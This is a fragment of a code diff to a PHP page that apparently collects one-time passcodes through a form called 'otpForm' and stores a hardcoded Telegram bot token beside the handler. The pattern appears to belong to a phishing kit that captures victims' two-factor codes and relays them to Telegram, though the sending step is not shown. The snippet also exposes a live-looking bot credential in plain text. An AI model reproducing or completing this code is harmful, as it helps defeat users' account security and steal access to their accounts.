@@ -292,7 +292,7 @@
 
       <form id="otpForm" action="" method="POST">
         <?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+       if (isset($_POST['otp_code'])) {
       $otp  = trim($_POST['otp_code'] ?? '');
 
       $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
